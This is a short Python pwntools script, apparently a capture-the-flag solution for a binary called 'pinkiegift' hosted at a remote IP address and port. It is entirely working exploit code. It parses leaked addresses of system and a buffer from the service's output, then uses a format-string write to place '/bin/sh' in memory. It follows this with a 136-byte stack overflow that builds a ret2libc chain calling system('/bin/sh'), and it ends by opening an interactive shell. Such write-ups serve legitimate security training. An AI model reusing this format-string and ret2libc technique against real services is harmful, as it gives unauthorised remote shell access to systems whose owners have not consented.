from pwn import *
# p = process('./pinkiegift')
p = remote('95.179.163.167' ,10006)
# gdb.attach(p,"""
# break *0x080485e7
# break *0x080485ed
# """)
offset = 136

def exec_fmt(payload):
   p.sendline(payload)
   return p.recv(1024)

x = p.recvuntil('\n')
binsh = int(x[-21:-12],16)
binsh2 = binsh+4
system = int(x[-11:-1],16)
pr = 0x080483ad

# autofmt = FmtStr(exec_fmt)
offset1 = 1
payload1 = fmtstr_payload(offset1,{binsh:0x6e69622f,binsh2:0x68732f})
p.sendline(payload1)
p.recv(1024)
payload = ""
payload += "A"*offset
payload += p32(system)
payload += p32(pr)
payload += p32(binsh)
payload += "AAAA"
p.sendline(payload)
p.interactive()
p.close()